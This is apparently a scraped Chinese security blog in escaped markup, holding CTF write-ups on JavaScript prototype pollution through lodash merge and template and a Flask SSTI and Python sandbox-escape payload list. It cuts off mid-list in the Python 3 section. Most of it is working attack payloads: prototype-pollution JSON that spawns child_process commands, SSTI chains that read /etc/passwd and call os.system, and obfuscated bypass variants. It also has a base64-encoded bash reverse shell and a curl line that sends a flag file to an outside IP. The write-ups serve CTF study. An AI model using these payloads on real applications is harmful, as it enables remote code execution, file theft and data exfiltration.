1234567891011121314151617181920const merge &#x3D; (a, b) &#x3D;&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] &#x3D; b[attr]; &#125; &#125; return a&#125;const clone &#x3D; (a) &#x3D;&gt; &#123; return merge(&#123;&#125;, a);&#125;...req.session.user.data &#x3D; clone(req.body);router.get(&#39;&#x2F;info&#39;, function (req, res) &#123; res.render(&#39;index&#39;,data&#x3D;&#123;&#39;user&#39;:res.outputFunctionName&#125;);&#125;) /actionæ±¡æŸ“åŸå‹é“¾ /infoè§¦å‘æ±¡æŸ“çš„åŸå‹é“¾ è®¾ç½®objectçš„outputFunctionNameçš„å±æ€§ï¼š{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}} payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag\\&quot;&#39;);var __tmp2&quot;&#125;&#125; å¤±è´¥äº†ï¼Œå°±æƒ³è°ƒè¯•ä¸‹jsï¼Œæœ¬åœ°æ­å»º 12#å®‰è£…æ¨¡å—npm install å‘ç°æ²¡æœ‰æä¾›ç«¯å£å¯åŠ¨ï¼ŒåŸæ–‡ä»¶æ˜¯åˆ©ç”¨bin/wwwé‡Œé¢å¯åŠ¨çš„ï¼Œä¸ºäº†æ–¹ä¾¿ç›´æ¥æ·»åŠ  1234567&#x2F;&#x2F;ç›‘å¬ç«¯å£ä¸º3000var server &#x3D; app.listen(3000, function () &#123; var host &#x3D; server.address().address; var port &#x3D; server.address().port; console.log(&#39;Example app listening at http:&#x2F;&#x2F;%s:%s&#39;, host, port);&#125;); node --inspect --debug-brk app.jså¯åŠ¨å³å¯åˆ©ç”¨chromeè‡ªå¸¦çš„è°ƒè¯• nodejsè°ƒè¯• æœªmerge()å‰ merge()å çœ‹ä¸‹æºç æ‰æ³¨æ„åˆ°req.session.user.data = clone(req.body); æ˜¯æ•´ä¸ªbodyã€‚ã€‚ã€‚ä¿®æ”¹è¯·æ±‚ä½“å³å¯ ä¹‹å‰çš„payloadå¤±è´¥æ˜¯å› ä¸ºæ²¡æœ‰ç”¨jsonæ ¼å¼å‘é€==ï¼ è®¿é—®/infoè§¦å‘åŸå‹é“¾ï¼Œè®¿é—®/flagä¸‹è½½å³å¯ Codebreaking-thejsserver.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs &#x3D; require(&#39;fs&#39;)const express &#x3D; require(&#39;express&#39;)const bodyParser &#x3D; require(&#39;body-parser&#39;)const lodash &#x3D; require(&#39;lodash&#39;)const session &#x3D; require(&#39;express-session&#39;)const randomize &#x3D; require(&#39;randomatic&#39;)const app &#x3D; express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;&#x2F;static&#39;, express.static(&#39;static&#39;))app.use(session(&#123; name: &#39;thejs.session&#39;, secret: randomize(&#39;aA0&#39;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; &#x2F;&#x2F; define the template engine fs.readFile(filePath, (err, content) &#x3D;&gt; &#123; if (err) return callback(new Error(err)) let compiled &#x3D; lodash.template(content) let rendered &#x3D; compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&#39;views&#39;, &#39;.&#x2F;views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;&#x2F;&#39;, (req, res) &#x3D;&gt; &#123; let data &#x3D; req.session.data || &#123;language: [], category: []&#125; if (req.method &#x3D;&#x3D; &#39;POST&#39;) &#123; data &#x3D; lodash.merge(data, req.body) req.session.data &#x3D; data &#125; res.render(&#39;index&#39;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () &#x3D;&gt; console.log(&#96;Example app listening on port 3000!&#96;)) ä½¿ç”¨ lodash å®ç°äº†ä¸€ä¸ªç®€å•çš„ ejs æ¨¡ç‰ˆå¼•æ“ï¼Œåœ¨è¯·æ±‚çš„æ—¶å€™æ¸²æŸ“ã€‚ lodashè¿™ä¸ªæ¨¡å—æä¾›äº†ä¸¤ä¸ªå·¥å…·lodash.templateå’Œlodash.mergeï¼Œåˆ†åˆ«å¯ç”¨æ¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“å’ŒåŸå‹é“¾è§¦å‘ mergeå°±å¯ä»¥æƒ³åˆ°ä¹‹å‰åˆ†æçš„åŸå‹é“¾æ±¡æŸ“çš„è§¦å‘ç‚¹ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªexpressæ¡†æ¶ï¼Œæ”¯æŒJsonç›´æ¥ä¼ è¾“æ•°æ®ï¼Œå¹¶ä¸”æ¥æ”¶çš„å‚æ•°ä¸ºreq.body lodash.templateçš„æºç  https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089 1234var result &#x3D; attempt(function() &#123; return Function(importsKeys, sourceURL + &#39;return &#39; + source) .apply(undefined, importsValues);&#125;); è¿½è¸ªsourceURL 1var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;; å…¶ä¸­ option ä¸ºæˆ‘ä»¬åœ¨æ¨¡ç‰ˆå¼•æ“ä¸­ï¼Œæ¸²æŸ“çš„å€¼ã€‚è¿™é‡Œè¯»å–å…¶ä¸­çš„ sourceURL å±æ€§çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™é‡Œè§¦å‘åŸå‹æ±¡æŸ“ payload 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\\r\\nreturn e &#x3D;&gt;&#123;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;);&#125;&quot;&#125;&#125;&#125; æ€»ç»“ç®€å•å­¦ä¹ äº†JavaScriptåŸå‹é“¾æ±¡æŸ“çš„åŸç†ä»¥åŠä¸¤é“ç®€å•çš„é¢˜ï¼Œä¸‹ä¸€æ­¥å­¦ä¹ å¯ä»¥æ˜¯ä¸€äº›æºç æ›´åŠ å¤æ‚ï¼Œæˆ–è€…ä¸å…¶ä»–æ¼æ´ç»“åˆåˆ©ç”¨ã€‚ å‚è€ƒé“¾æ¥ï¼š https://www.anquanke.com/post/id/176884 https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[],"tags":[{"name":"js","slug":"js","permalink":"https://glotozz.github.io/tags/js/"}]},{"title":"flaskæ¨¡ç‰ˆæ³¨å…¥","slug":"flaskæ¨¡ç‰ˆæ³¨å…¥","date":"2020-02-24T01:11:15.000Z","updated":"2020-03-06T02:02:31.789Z","comments":true,"path":"2020/02/24/flaskæ¨¡ç‰ˆæ³¨å…¥/","link":"","permalink":"https://glotozz.github.io/2020/02/24/flask%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/","excerpt":"æ¯”èµ›æ—¶é‡åˆ°flask sstiï¼Œé‚å¤ä¹ ä¸€ä¸‹","text":"æ¯”èµ›æ—¶é‡åˆ°flask sstiï¼Œé‚å¤ä¹ ä¸€ä¸‹ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç®€è¿° Python2 Python3 Some Tricksï¼ˆæµ‹è¯•ç¯å¢ƒä¸ºPy2ï¼‰ æ€»ç»“ å‚è€ƒé“¾æ¥ï¼š ç®€è¿° æ¼æ´åŸç†å‚è€ƒ æ¼æ´åŸç†ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼šä¸æ­£ç¡®çš„ä½¿ç”¨flaskä¸­çš„render_template_string()å¯¼è‡´çš„SSTIï¼Œå¹¶ä¸”æ¨¡æ¿å†…å®¹ç›´æ¥å—ç”¨æˆ·æ§åˆ¶ è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯å€Ÿflask SSTIå¤ä¹ ä¸‹pythonæ²™ç›’é€ƒé€¸ï¼Œæ•´ç†ä¸‹payloadï¼Œç†è®ºä¸Šä¸åŒæœºå™¨ã€ä¸åŒpythonç‰ˆæœ¬çš„payloadæ˜¯ä¸å°½ç›¸åŒçš„ã€‚ æµ‹è¯•ä»£ç  1234567@app.route('/')def test(): code = request.args.get('id') html = ''' &lt;h3&gt;%s&lt;/h3&gt; '''%(code) return render_template_string(html) ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼š flask run --host=0.0.0.0ï¼Œéœ€è¦å¯åŠ¨çš„æ—¶å€™è®¾ç½®hostï¼Œapp.run()ä¸­æ›´æ”¹æ— æ•ˆ python app.pyï¼Œåœ¨app.run()ä¸­è®¾ç½®hostï¼Œåˆ‡æ¢pythonç‰ˆæœ¬æ¯”è¾ƒæ–¹ä¾¿ ç¡®è®¤æ­£å¸¸è®¿é—® å…¨å±€å˜é‡ ,æ¯”è¾ƒå¸¸è§çš„è¯»å–æ˜¯SECRET_KEY æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ æ— è®ºæ˜¯å®ç°æ–‡ä»¶è¯»å–è¿˜æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦åˆ©ç”¨å¯¹è±¡çš„ç»§æ‰¿ï¼Œå…ˆæ‰¾åˆ°çˆ¶ç±»&lt;type &#39;object&#39;&gt;ï¼Œå†å¯»æ‰¾å­ç±»ï¼Œæœ€åæ‰¾åˆ°æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„ç›¸åº”æ¨¡å— å‡ ä¸ªè¦ç”¨åˆ°çš„é­”æœ¯æ–¹æ³• 12345678__class__ è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡__mro__ è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚__base__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»&#x2F;&#x2F; __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__ æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨__init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³•__globals__ å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ Python2å…ˆæµ‹è¯•Python 2.7.17 éœ€è¦å…ˆé€‰å–ä¸€ä¸ªç±»ï¼Œå‡ ç§å¸¸è§çš„ç±»&#39;&#39;ã€requestã€[]ã€() 1ã€è·å–ç±»å¯¹è±¡ 123456789&gt;&gt;&gt; &#39;&#39;.__class__&lt;type &#39;str&#39;&gt;&gt;&gt;&gt; import request&gt;&gt;&gt; request.__class__&lt;type &#39;module&#39;&gt;&gt;&gt;&gt; [].__class__&lt;type &#39;list&#39;&gt;&gt;&gt;&gt; ().__class__&lt;type &#39;tuple&#39;&gt; 2ã€å¯»æ‰¾åŸºç±»object 12345678910111213&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; request.__class__.__mro__(&lt;type &#39;module&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &#39;list&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; ().__class__.__mro__(&lt;type &#39;tuple&#39;&gt;, &lt;type &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;type &#39;object&#39;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &#39;object&#39;&gt; objectåœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡__mro__[-1]å¯ä»¥è·å–åˆ° 3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨ 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;urlparse.ResultMixin&#39;&gt;, &lt;type &#39;collections.deque&#39;&gt;, &lt;type &#39;deque_iterator&#39;&gt;, &lt;type &#39;deque_reverse_iterator&#39;&gt;, &lt;type &#39;operator.itemgetter&#39;&gt;, &lt;type &#39;operator.attrgetter&#39;&gt;, &lt;type &#39;operator.methodcaller&#39;&gt;, &lt;type &#39;itertools.combinations&#39;&gt;, &lt;type &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;type &#39;itertools.cycle&#39;&gt;, &lt;type &#39;itertools.dropwhile&#39;&gt;, &lt;type &#39;itertools.takewhile&#39;&gt;, &lt;type &#39;itertools.islice&#39;&gt;, &lt;type &#39;itertools.starmap&#39;&gt;, &lt;type &#39;itertools.imap&#39;&gt;, &lt;type &#39;itertools.chain&#39;&gt;, &lt;type &#39;itertools.compress&#39;&gt;, &lt;type &#39;itertools.ifilter&#39;&gt;, &lt;type &#39;itertools.ifilterfalse&#39;&gt;, &lt;type &#39;itertools.count&#39;&gt;, &lt;type &#39;itertools.izip&#39;&gt;, &lt;type &#39;itertools.izip_longest&#39;&gt;, &lt;type &#39;itertools.permutations&#39;&gt;, &lt;type &#39;itertools.product&#39;&gt;, &lt;type &#39;itertools.repeat&#39;&gt;, &lt;type &#39;itertools.groupby&#39;&gt;, &lt;type &#39;itertools.tee_dataobject&#39;&gt;, &lt;type &#39;itertools.tee&#39;&gt;, &lt;type &#39;itertools._grouper&#39;&gt;, &lt;type &#39;_thread._localdummy&#39;&gt;, &lt;type &#39;thread._local&#39;&gt;, &lt;type &#39;thread.lock&#39;&gt;, &lt;class &#39;string.Template&#39;&gt;, &lt;class &#39;string.Formatter&#39;&gt;, &lt;type &#39;_io._IOBase&#39;&gt;, &lt;type &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;type &#39;_hashlib.HASH&#39;&gt;, &lt;type &#39;_random.Random&#39;&gt;, &lt;type &#39;cStringIO.StringO&#39;&gt;, &lt;type &#39;cStringIO.StringI&#39;&gt;, &lt;type &#39;time.struct_time&#39;&gt;] 4ã€æ–‡ä»¶è¯»å– Payload 1 å‘ç°40çš„åœ°æ–¹å­˜åœ¨ &lt;type &#39;file&#39;&gt; 12&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()request.__class__.__mro__[1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() æŸ¥ä¸‹æ ‡ 1[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&#39;file&#39;) 1234567#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[2].__subclasses__(): print num print item num+=1 Payload 2 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() 5ã€å‘½ä»¤æ‰§è¡Œ å¯»æ‰¾åŒ…å«osæ¨¡å—çš„è„šæœ¬ 1234567891011#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[-1].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 å¾—åˆ° 12345671 &lt;class &#39;site._Printer&#39;&gt;----76 &lt;class &#39;site.Quitter&#39;&gt; å‰é¢å·²ç»æ‰¾åˆ°äº†åŒ…å«osæ¨¡å—çš„ç±»ï¼Œå…ˆåˆå§‹åŒ–ï¼Œå†å¼•ç”¨å³å¯ 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) åªä¸è¿‡å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦åå¼¹shellæˆ–è€…åˆ©ç”¨curlå¸¦å‡º åå¼¹shell 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash&#39;) curlå¸¦å‡º 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;data&#x3D;$(cat &#x2F;fffffflag | base64);curl http:&#x2F;&#x2F;117.78.1.204&#x2F;?data&#x3D;$data;&#39;) catch_warningsä¹Ÿå¯ä»¥è¿›ä¸€æ­¥æ„é€ æ¥æ‰§è¡Œå‘½ä»¤ 1259&lt;class &#39;warnings.catch_warnings&#39;&gt; å…ˆä»‹ç»ä¸¤ä¸ªå±æ€§ï¼Œå·²çŸ¥å‡½æ•°åå¯è·å–å‡½æ•°ä¿¡æ¯ 1234567891011def fun(x&#x3D;1): # nothing here a&#x3D;x*2 flag&#x3D;&#39;neko&#39; return aprint fun.func_code.co_constsprint fun.func_globals&#x3D;&gt;(None, 2, &#39;neko&#39;)&#123;&#39;__builtins__&#39;: &lt;module &#39;__builtin__&#39; (built-in)&gt;, &#39;__file__&#39;: &#39;b.py&#39;, &#39;__package__&#39;: None, &#39;fun&#39;: &lt;function fun at 0x7f1b9317e750&gt;, &#39;__name__&#39;: &#39;__main__&#39;, &#39;__doc__&#39;: None&#125; å¯æ„é€  1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;) è¿˜æœ‰å‡ ç§å˜å½¢ 1234567891011__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&quot;l&quot;+&quot;s&quot;)__builtins__.__dict__[&#39;X19pbXBvcnRfXw&#x3D;&#x3D;&#39;.decode(&#39;base64&#39;)](&#39;b3M&#x3D;&#39;.decode(&#39;base64&#39;)).__getattribute__(&#39;sys&#39;+&#39;tem&#39;)(&#39;l&#39;+&#39;s&#39;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;ls&#39;)[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&#39;ls&#39;)&#123;(lambda getthem&#x3D;([x for x in ().__class__.__base__.__subclasses__() if x.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;][0]()._module.__builtins__):getthem[&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;))()&#125; Python3Python 3.7.5 1ã€è·å–ç±»å¯¹è±¡ 123456&gt;&gt;&gt; &#39;&#39;.__class__&lt;class &#39;str&#39;&gt;&gt;&gt;&gt; ().__class__&lt;class &#39;tuple&#39;&gt;&gt;&gt;&gt; [].__class__&lt;class &#39;list&#39;&gt; 2ã€å¯»æ‰¾åŸºç±»object 1234567&gt;&gt;&gt; &#39;&#39;.__class__.__mro__(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;class &#39;list&#39;&gt;, &lt;class &#39;object&#39;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;class &#39;object&#39;&gt; 3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨ 12&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[-1].__subclasses__()[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;Context&#39;&gt;, &lt;class &#39;ContextVar&#39;&gt;, &lt;class &#39;Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;zipimport.zipimporter&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class 